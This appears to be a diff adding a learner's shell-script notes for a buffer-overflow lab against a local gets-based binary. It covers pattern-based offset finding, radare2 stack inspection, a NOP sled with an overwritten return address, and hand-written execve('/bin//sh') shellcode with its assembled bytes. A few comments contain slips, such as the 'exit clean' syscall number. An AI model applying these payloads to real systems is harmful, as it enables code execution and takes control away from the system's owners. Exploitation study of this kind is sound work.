@@ -1,0 +1,129 @@
+#!/bin/sh
+
+## I know from last time the buffer is 120 byte
+## double check
+cyclic 121 | ./vuln                  # yep
+normal cyclic 126 | strace ./vuln    # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x616762616166} ---"
+normal cyclic 127 | strace ./vuln    # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL , si_addr=NULL} ---"
+
+## good, but this time there is no magic function, we need to execute shellcode on the stack
+## lets make sure it works with nops
+python2 -c 'print("\x90"*125)' |
+strace ./vuln                        # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x9090909090} ---"
+
+
+## now I will use radare2 to find the stack
+## you can use any debugger you like but I like radare
+## these are the commands I issue:
+r2 -A -d ./vuln
+
+## [0x7ffff7fce090]> dcu main                 # Debug Continue Until main function
+## [0x00401136]> px @ rsp                     # Print heX @t address rsp (stack pointer) 
+
+# - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+# 0x7fffffffdd18  250b dff7 ff7f 0000 08de ffff ff7f 0000  %...............
+# 0x7fffffffdd28  6400 0000 0100 0000 3611 4000 0000 0000  d.......6.@.....
+# -- snip --
+
+## [0x00401136]> pdf 
+#  189: int main (int argc, char **argv);
+# -- snip --
+#           0x00401136      55             push rbp
+#           0x00401137      4889e5         mov rbp, rsp
+#           0x0040113a      4883c480       add rsp, 0xffffffffffffff80  # (sub rsp, 0x80) create 0x80 bytes of space on the stack 
+# -- snip --
+#           0x004011ac      488d05510e00.  lea rax, str.enter_msg:_    ; 0x402004 ; "enter msg: "
+#           0x004011b3      4889c7         mov rdi, rax
+#           0x004011b6      b800000000     mov eax, 0
+#           0x004011bb      e870feffff     call sym.imp.printf         ; int printf(const char *format)
+#           0x004011c0      488d4590       lea rax, [var_70h]
+#           0x004011c4      4889c7         mov rdi, rax
+#           0x004011c7      b800000000     mov eax, 0
+#           0x004011cc      e86ffeffff     call sym.imp.gets           ; char *gets(char *s)
+#           0x004011d1      488d4590       lea rax, [var_70h]
+#           0x004011d5      4889c6         mov rsi, rax
+#           0x004011d8      488d05310e00.  lea rax, str.msg:__s_n      ; 0x402010 ; "msg: %s\n"
+#           0x004011df      4889c7         mov rdi, rax
+#           0x004011e2      b800000000     mov eax, 0
+#           0x004011e7      e844feffff     call sym.imp.printf         ; int printf(const char *format)
+#           0x004011ec      b800000000     mov eax, 0
+#           0x004011f1      c9             leave
+#           0x004011f2      c3             ret
+
+## [0x00401136]> dcu 0x004011f1       # continue until leave instruction
+
+# enter msg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# msg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+## [0x004011f1]> px @ rsp
+
+# - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+# 0x7fffffffdc90  08de ffff ff7f 0000 0000 0000 0100 0000  ................
+# 0x7fffffffdca0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+# -- snip --
+# 0x7fffffffdd10  4141 4141 4141 4141 4141 00f7 ff7f 0000  AAAAAAAAAA......
+
+## this means our input starts at 0x7fffffffdd10 - 10 = 0x7fffffffdd06
+## lets try jump to that address and debug to make sure
+python2 -c 'print("\x90"*120+"\x06\xdd\xff\xff\xff\x7f\x00\x00")' |
+strace ./vuln                                 # "--- SIGILL {si_signo=SIGILL, si_code=ILL_ILLOPN, si_addr=0x7fffffffdd18} ---"
+python2 -c 'print("\x90"*120+"\x06\xdd\xff\xff\xff\x7f\x00\x00")' > pattern
+echo "#\!/bin/rarun2
+stdin=./pattern" > profile.rr2
+# r2 -A -r profile.rr2 -d ./vuln
+
+## seems I was thinking the stack upside down, the correct addres (for me) is 0x7fffffffecf0
+python2 -c 'print("\x90"*120+"\xf0\xec\xff\xff\xff\x7f\x00\x00")' > pattern 
+# r2 -A -r profile.rr2 -d ./vuln
+
+## after "ret" I jump to my nop sled
+# [0x7fffffffecf0]> pd
+#             ;-- rip:
+#             0x7fffffffecf0      90             nop
+#             0x7fffffffecf1      90             nop
+#             0x7fffffffecf2      90             nop
+#             0x7fffffffecf3      90             nop
+#             0x7fffffffecf4      90             nop
+#             0x7fffffffecf5      90             nop
+#             0x7fffffffecf6      90             nop
+#             0x7fffffffecf7      90             nop
+
+## now to write shellcode
+## (I would obv never really do it like this, use an editor)
+echo "
+BITS 64
+
+global _start
+
+_start:
+    xor rax, rax
+    push rax
+    xor rdx, rdx
+    xor rsi, rsi
+    mov rbx,'/bin//sh'
+    push rbx
+    push rsp
+    pop rdi
+    mov al, 0x3b
+    syscall
+
+    xor rax, rax
+    mov al, 0x3b              ; exit clean
+    syscall
+
+" > shell64.asm
+nasm shell64 
+python3 -c 'print(open("shell64", "rb").read())'        # b'PH1\xd2H1\xf6H\xbb/bin//shST_\xb0;\x0f\x05\xb8;\x00\x00\x00\x0f\x05'
+python3 -c 'print(len(open("shell64", "rb").read()))'   # 31
+
+## TBC
+
+
+
+
+
+
+
+
+
+
